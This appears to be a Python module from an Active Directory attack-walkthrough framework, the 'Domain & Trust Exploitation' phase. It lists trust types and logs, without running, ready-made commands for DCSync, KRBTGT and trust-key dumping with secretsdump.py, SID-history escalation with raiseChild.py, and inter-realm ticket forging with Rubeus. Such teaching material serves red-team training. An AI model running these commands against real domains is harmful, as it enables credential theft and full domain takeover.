"""
Phase 5: Domain & Trust Exploitation
====================================

Exploit Active Directory trust relationships for cross-domain access.
"""

from typing import List, Dict

from .base import BasePhase
from ..models import Credential


class TrustExploitationPhase(BasePhase):
    """
    Phase 5: Domain & Trust Exploitation

    Compromise domain controllers and exploit trust relationships
    to gain access to additional domains and forests.
    """

    PHASE_NUMBER = 5
    PHASE_NAME = "DOMAIN & TRUST EXPLOITATION"
    PHASE_DESCRIPTION = "Exploit trust relationships for cross-domain access"

    # Trust types
    TRUST_TYPES = [
        {
            "name": "Parent-Child Trust",
            "description": "Automatic trust within AD forest between parent and child domains",
            "properties": ["Transitive", "Bidirectional"],
            "sid_filtering": "Disabled by default",
            "attack_vector": "SID History Injection",
            "example": "CORP.LOCAL ↔ DEV.CORP.LOCAL",
        },
        {
            "name": "Forest Trust",
            "description": "Trust between different AD forests",
            "properties": ["Can be transitive or non-transitive", "Bidirectional or one-way"],
            "sid_filtering": "Enabled by default",
            "attack_vector": "Trust Key Extraction + Inter-Realm TGT",
            "example": "CORP.LOCAL ↔ PARTNER.COM",
        },
        {
            "name": "External Trust",
            "description": "Trust between domains in different forests (non-transitive)",
            "properties": ["Non-transitive", "One-way or bidirectional"],
            "sid_filtering": "Enabled by default",
            "attack_vector": "Similar to forest trust",
            "example": "CORP.LOCAL → VENDOR.COM",
        },
        {
            "name": "Shortcut Trust",
            "description": "Manual trust to improve authentication performance",
            "properties": ["Transitive", "Bidirectional"],
            "sid_filtering": "Follows forest defaults",
            "attack_vector": "Direct path between child domains",
            "example": "DEV.CORP.LOCAL ↔ PROD.CORP.LOCAL",
        },
    ]

    # Trust enumeration commands
    ENUMERATION = [
        {
            "name": "nltest",
            "command": "nltest /domain_trusts",
            "description": "Quick trust enumeration",
            "output": "Lists all trusted domains",
        },
        {
            "name": "PowerShell AD Module",
            "command": "Get-ADTrust -Filter *",
            "description": "Detailed trust information",
            "output": "Trust direction, type, attributes",
        },
        {
            "name": "PowerView",
            "command": "Get-DomainTrust",
            "description": "PowerView trust enumeration",
            "output": "Detailed trust properties",
        },
        {
            "name": "Forest Enumeration",
            "command": "([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).Domains",
            "description": "List all domains in forest",
            "output": "Domain names in current forest",
        },
        {
            "name": "BloodHound",
            "command": "Invoke-BloodHound -CollectionMethod All",
            "description": "Graph-based trust visualization",
            "output": "Visual attack paths across trusts",
        },
    ]

    # Trust exploitation techniques
    EXPLOITATION = [
        {
            "name": "SID History Injection (Child → Parent)",
            "when": "Domain admin on child domain, want Enterprise Admin",
            "how": "Inject Enterprise Admins SID into ticket's SID history",
            "tools": ["raiseChild.py", "Mimikatz"],
            "command": "raiseChild.py childDomain/childAdmin:pass -target-exec parentDC",
            "requires": "Domain admin on child, SID filtering disabled (default in forest)",
            "result": "Enterprise Admin access on forest root",
        },
        {
            "name": "Trust Key Extraction",
            "when": "Domain admin, want to access trusted forest",
            "how": "Extract trust key from DC, use to forge inter-realm tickets",
            "tools": ["secretsdump.py", "Mimikatz"],
            "command": "secretsdump.py domain/admin:pass@dc -just-dc-user TRUST$",
            "requires": "Domain admin on current domain",
            "result": "Trust key (NTLM and AES)",
        },
        {
            "name": "Inter-Realm TGT Forging",
            "when": "Have trust key, want to access trusted domain",
            "how": "Forge Kerberos ticket using trust key",
            "tools": ["Rubeus", "Mimikatz"],
            "command": "Rubeus.exe asktgs /user:Administrator /rc4:<trust_key> /service:krbtgt/trusted.domain",
            "requires": "Trust key",
            "result": "Access to trusted domain resources",
        },
        {
            "name": "DCSync Across Trust",
            "when": "Have access to trusted domain via forged ticket",
            "how": "DCSync to dump trusted domain credentials",
            "tools": ["secretsdump.py", "Mimikatz"],
            "command": "secretsdump.py -k trusted.domain/Administrator@trusted-dc",
            "requires": "Forged ticket with appropriate permissions",
            "result": "All credentials from trusted domain",
        },
    ]

    # Domain controller actions
    DC_ACTIONS = [
        {
            "name": "DCSync Attack",
            "command": "secretsdump.py domain/admin:pass@dc -just-dc",
            "description": "Replicate credentials from DC",
            "yields": "All domain user hashes",
        },
        {
            "name": "KRBTGT Extraction",
            "command": "secretsdump.py domain/admin:pass@dc -just-dc-user krbtgt",
            "description": "Extract KRBTGT hash",
            "yields": "Golden ticket capability",
        },
        {
            "name": "Full Domain Dump",
            "command": "secretsdump.py domain/admin:pass@dc",
            "description": "Dump all secrets from DC",
            "yields": "User hashes, computer accounts, trust keys",
        },
    ]

    def execute(self, domain_admin_creds: Credential, domain: str, **kwargs) -> bool:
        """
        Execute domain and trust exploitation.

        Args:
            domain_admin_creds: Domain admin credentials
            domain: Target domain

        Returns:
            True if exploitation successful
        """
        self.log_header()

        # Step 1: DC Compromise
        self.log("\n[*] Step 1: Domain Controller Compromise")
        self._compromise_dc(domain_admin_creds, domain)

        # Step 2: Trust Enumeration
        self.log("\n[*] Step 2: Trust Enumeration")
        self._enumerate_trusts()

        # Step 3: Trust Exploitation
        self.log("\n[*] Step 3: Trust Exploitation")
        self._exploit_trusts()

        # Add domain to compromised list
        self.state.add_domain(domain)

        return True

    def _compromise_dc(self, creds: Credential, domain: str) -> None:
        """Compromise domain controller"""
        self.log(f"    Target Domain: {domain}")
        self.log(f"    Using credentials: {creds.full_username}")

        for action in self.DC_ACTIONS:
            self.log(f"\n    {action['name']}")
            self.log(f"      Command: {action['command']}")
            self.log(f"      Description: {action['description']}")
            self.log(f"      Yields: {action['yields']}")

    def _enumerate_trusts(self) -> None:
        """Enumerate trust relationships"""
        self.log("    Enumerating trust relationships...")

        for enum in self.ENUMERATION:
            self.log(f"\n    {enum['name']}")
            self.log(f"      Command: {enum['command']}")
            self.log(f"      Description: {enum['description']}")

        self.log("\n    Trust Types to Identify:")
        for trust_type in self.TRUST_TYPES:
            self.log(f"\n    {trust_type['name']}")
            self.log(f"      Description: {trust_type['description']}")
            self.log(f"      Properties: {', '.join(trust_type['properties'])}")
            self.log(f"      SID Filtering: {trust_type['sid_filtering']}")
            self.log(f"      Attack Vector: {trust_type['attack_vector']}")
            self.log(f"      Example: {trust_type['example']}")

    def _exploit_trusts(self) -> None:
        """Exploit trust relationships"""
        self.log("    Trust Exploitation Techniques:")

        for tech in self.EXPLOITATION:
            self.log(f"\n    {tech['name']}")
            self.log(f"      When: {tech['when']}")
            self.log(f"      How: {tech['how']}")
            self.log(f"      Tools: {', '.join(tech['tools'])}")
            self.log(f"      Command: {tech['command']}")
            self.log(f"      Requires: {tech['requires']}")
            self.log(f"      Result: {tech['result']}")

    def get_trust_type_info(self, trust_type: str) -> Dict:
        """Get information about a specific trust type"""
        for t in self.TRUST_TYPES:
            if trust_type.lower() in t["name"].lower():
                return t
        return {}

    def get_exploitation_technique(self, name: str) -> Dict:
        """Get a specific exploitation technique"""
        for tech in self.EXPLOITATION:
            if name.lower() in tech["name"].lower():
                return tech
        return {}